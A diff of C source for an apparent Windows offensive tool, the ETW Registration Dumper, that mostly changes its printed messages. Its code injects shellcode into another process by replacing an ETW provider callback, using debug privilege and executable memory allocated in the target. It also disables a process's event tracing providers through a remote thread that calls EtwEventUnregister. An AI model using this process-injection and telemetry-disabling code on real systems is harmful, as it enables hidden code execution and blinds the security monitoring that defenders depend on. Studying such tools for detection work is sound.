@@ -272,7 +272,7 @@ VOID etw_search_process(
       sizeof(RTL_RB_TREE), &rd);
     
     wprintf(L"*********************************************\n");
-    wprintf(L"EtwpRegistrationTable for %ws:%i at %p\n", 
+    wprintf(L"  [ EtwpRegistrationTable for %ws:%i found at %p\n\n", 
       pe32->szExeFile, pe32->th32ProcessID, etw);
       
     // dump nodes
@@ -395,7 +395,7 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
     // try read shellcode into memory
     plen = readpic(path, &pdata);
     if(plen == 0) { 
-      wprintf(L"ERROR: Unable to read shellcode from %s\n", path); 
+      wprintf(L"  [ ERROR: Unable to read shellcode from %s\n", path); 
       return FALSE; 
     }
     
@@ -403,12 +403,13 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
     etw = etw_get_table_va();
     
     if(etw == NULL) {
-      wprintf(L"ERROR: Unable to obtain address of ETW Registration Table.\n");
+      wprintf(L"  [ ERROR: Unable to obtain address of ETW Registration Table.\n");
       return FALSE;
     }
     
-    printf("*********************************************\n");
-    printf("EtwpRegistrationTable for %i found at %p\n", pid, etw);  
+    wprintf(L"*********************************************\n");
+    wprintf(L"  [ The EtwpRegistrationTable in %s:%i was found at %p\n\n", 
+      pid2name(pid), pid, etw);
     
     // try open target process
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -431,8 +432,8 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
       StringFromGUID2(&re.ProviderId, id, sizeof(id));
       name = etw_id2name(id);
         
-      wprintf(L"Address of remote node  : %p\n", (PVOID)node);
-      wprintf(L"Using %s (%s)\n", id, name);
+      wprintf(L"  [ Address of remote node  : %p\n", (PVOID)node);
+      wprintf(L"  [ Using %s (%s)\n", id, name);
       
       // allocate memory for shellcode
       cs = VirtualAllocEx(
@@ -441,8 +442,8 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
         PAGE_EXECUTE_READWRITE);
         
       if(cs != NULL) {
-        wprintf(L"Address of old callback : %p\n", re.Callback);
-        wprintf(L"Address of new callback : %p\n", cs);
+        wprintf(L"  [ Address of old callback : %p\n", re.Callback);
+        wprintf(L"  [ Address of new callback : %p\n", cs);
         
         // write shellcode
         WriteProcessMemory(hp, cs, pdata, plen, &wr);
@@ -492,7 +493,7 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
         VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
       }        
     } else {
-      wprintf(L"ERROR: Unable to get registration entry.\n");
+      wprintf(L"  [ ERROR: Unable to get registration entry.\n");
     }
     CloseHandle(hp);
     return status;
@@ -518,7 +519,7 @@ typedef struct _disable_ctx {
     ULONG             Result;
 } disable_ctx;
   
-// disable ETW provider
+// disable ETW provider using code stub
 DWORD WINAPI DisableStub(LPVOID lpParameter) {
     disable_ctx *ctx;
     
@@ -539,62 +540,36 @@ BOOL etw_disable(
     HMODULE               m;
     HANDLE                ht;
     RtlCreateUserThread_t pRtlCreateUserThread;
-    disable_ctx           c;
-    LPVOID                cs, ds;
-    PBYTE                 code, data;
-    SIZE_T                wr, rd;
-    DWORD                 cslen, dslen;
     CLIENT_ID             cid;
     NTSTATUS              nt=~0UL;
-    DWORD                 t;
+    REGHANDLE             RegHandle;
+    EventUnregister_t     pEtwEventUnregister;
+    ULONG                 Result;
     
+    // resolve address of API for creating new thread
     m = GetModuleHandle(L"ntdll.dll");
     pRtlCreateUserThread = (RtlCreateUserThread_t)
         GetProcAddress(m, "RtlCreateUserThread");
-       
-    c.RegHandle       = (REGHANDLE)((ULONG64)node | (ULONG64)index << 48);
-    c.EventUnregister = (EventUnregister_t)GetProcAddress(m, "EtwEventUnregister");
+    pEtwEventUnregister = (EventUnregister_t)GetProcAddress(m, "EtwEventUnregister");
     
-    dslen = sizeof(disable_ctx);
-    data  = (PBYTE)&c;
-    
-    wprintf(L"  [ Allocating %i bytes of memory for data.\n", dslen);
-    
-    ds = VirtualAllocEx(hp, NULL, dslen,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    WriteProcessMemory(hp, ds, data, dslen, &wr);
-      
-    cslen = (PBYTE)&DisableStubEnd - (PBYTE)&DisableStub;
-    code  = (PBYTE)&DisableStub;
-    
-    wprintf(L"  [ Allocating %i bytes of memory for code.\n", cslen);
-    
-    cs = VirtualAllocEx(hp, NULL, cslen, 
-      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hp, cs, code, cslen, &wr); 
-    
-    wprintf(L"  [ Code : %p data : %p.\n", cs, ds);
+    // create registration handle    
+    RegHandle           = (REGHANDLE)((ULONG64)node | (ULONG64)index << 48);
 
-    // execute payload in remote process
-    printf("  [ Creating new thread.\n");
+    // execute API in remote process
+    printf("  [ Executing EventUnregister in remote process.\n");
     nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
-      NULL, cs, ds, &ht, &cid);
+      NULL, pEtwEventUnregister, (PVOID)RegHandle, &ht, &cid);
 
-    printf("  [ nt status is %lx\n", nt);
+    printf("  [ NTSTATUS is %lx\n", nt);
     WaitForSingleObject(ht, INFINITE);
     
-    ReadProcessMemory(hp, ds, data, dslen, &rd);
-    // close remote thread handle
+    // read result of EtwEventUnregister
+    GetExitCodeThread(ht, &Result);
     CloseHandle(ht);
     
-    // free remote memory
-    printf("  [ Releasing memory.\n\n");
-    VirtualFreeEx(hp, cs, 0, MEM_RELEASE | MEM_DECOMMIT);
-    VirtualFreeEx(hp, ds, 0, MEM_RELEASE | MEM_DECOMMIT);
+    SetLastError(Result);
     
-    SetLastError(c.Result);
-    
-    if(c.Result != ERROR_SUCCESS) {
+    if(Result != ERROR_SUCCESS) {
       xstrerror(L"etw_disable");
       return FALSE;
     }
@@ -617,7 +592,7 @@ VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
     etw = etw_get_table_va();
     
     if(etw == NULL) {
-      wprintf(L"ERROR: Unable to resolve address of ETW registration table.\n");
+      wprintf(L"  [ ERROR: Unable to resolve address of ETW registration table.\n");
       return;
     }
     
@@ -647,14 +622,14 @@ VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
             node = etw_get_reg(hp, etw, prov, &re);
             if(node != NULL) {
               wprintf(L"*********************************************\n");
-              wprintf(L"Provider found in %ws:%i at %p\n\n", 
+              wprintf(L"  [ Provider found in %ws:%i at %p\n\n", 
                 pe.szExeFile, pe.th32ProcessID, (LPVOID)node);
       
               // show contents of it
               etw_reg_info(hp, node, &re, 0);
               // disable it?
               if(opt & ETW_OPT_DISABLE) {
-                wprintf(L"Tracing disabled: %s\n",
+                wprintf(L"  [ Tracing disabled: %s\n",
                   etw_disable(hp, node, re.RegIndex) ? L"OK" : L"FAILED");
               }
             }
@@ -688,7 +663,7 @@ int wmain(int argc, WCHAR *argv[]) {
             *process = NULL;
     int     i, pid=0, opt = ETW_OPT_SEARCH;
     
-    puts("\nETW Registration Dumper. Copyright (c) Odzhan\n");
+    puts("\n  [ ETW Registration Dumper. Copyright (c) Odzhan\n");
     
     for(i=1; i<=argc-1; i++) {
       // is this a switch?
@@ -733,31 +708,30 @@ int wmain(int argc, WCHAR *argv[]) {
       pid = name2pid(process);
       if(pid == 0) pid = wcstoull(process, NULL, 10);
       if(pid == 0) {
-        wprintf(L"ERROR: Unable to resolve pid for \"%s\".\n", process);
+        wprintf(L"  [ ERROR: Unable to resolve pid for \"%s\".\n", process);
         return -1;
       }
     }
     // injection specified, but no file or target process supplied?
     if ((opt & ETW_OPT_INJECT) && (file == NULL || pid == 0)) {
-      wprintf(L"ERROR: No shellcode or process specified for injection.\n");
+      wprintf(L"  [ ERROR: No shellcode or process specified for injection.\n");
       return 0;
     }
     
     // try enable debug privilege
     if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
-      wprintf(L"WARNING: Failed to enable debugging privilege.\n");
+      wprintf(L"  [ WARNING: Failed to enable debugging privilege.\n");
     }
     
     // inject code?
     if(opt & ETW_OPT_INJECT) {
-      wprintf(L"STATUS: Injection into %s : %s.\n", 
-        process, 
+      wprintf(L"  [ STATUS: %s.\n", 
         etw_inject(pid, file, prov) ? L"complete" : L"failed");
     } else {
       // perform a search or disable providers
       etw_search_system(pid, dll, prov, opt);
       
-      printf("Found %i providers.\n", prov_cnt);
+      wprintf(L"  [ Found %i providers that meet your criteria.\n", prov_cnt);
     }
     return 0;
 }
